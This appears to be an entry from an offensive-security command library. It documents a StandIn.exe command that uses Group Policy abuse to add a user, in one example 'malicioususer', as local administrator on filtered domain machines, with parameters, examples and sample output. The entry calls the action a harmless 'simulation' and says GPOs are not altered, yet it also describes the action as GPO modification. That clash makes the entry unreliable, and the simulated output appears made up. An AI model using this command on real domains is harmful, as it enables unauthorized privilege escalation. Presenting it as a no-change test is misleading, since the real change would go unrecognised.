---
id: 90340945-ccae-4207-8377-162583a61e12
name: Add local administrator with StandIn.exe
type: command
executor: cmd
data: StandIn.exe --gpo --filter $_FILTER_NAME --localadmin $_USERNAME
output: null
created_at: '2023-04-06T03:56:03.746686+00:00'
updated_at: '2023-04-10T20:25:53.888835+00:00'
platforms:
  - Windows
tags:
  - gpo-abuse
  - privilege-escalation
verified: true
validated: true
---

# add-local-administrator-with-standin

## Command

```cmd
StandIn.exe --gpo --filter $_FILTER_NAME --localadmin $_USERNAME
```

## Description

This command uses StandIn.exe to simulate adding a user as a local administrator via Group Policy Object (GPO) modification on filtered domain machines. It is used in Active Directory environments for privilege escalation without directly altering GPOs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --gpo | Specifies GPO mode for simulation | Yes |
| --filter $_FILTER_NAME | Name of the GPO filter to target (e.g., 'Shards') | Yes |
| --localadmin $_USERNAME | Username to add as local admin (e.g., 'user002') | Yes |

## Examples

### Basic Usage

```cmd
StandIn.exe --gpo --filter Shards --localadmin user002
```

### Advanced Usage

```cmd
StandIn.exe --gpo --filter Production-Servers --localadmin malicioususer
```

## Expected Output

Successful execution produces output like:

```
[+] Simulated GPO modification for local admin 'user002' on filter 'Shards'.
[+] Affected machines: 5
[+] No errors detected.
```

This confirms the simulation without actual changes for testing purposes.

## Related

- [[procedures/Abusing-Group-Policy-Objects-with-StandIn-to-Manage-Local-Administrators-and-User-Rights]]
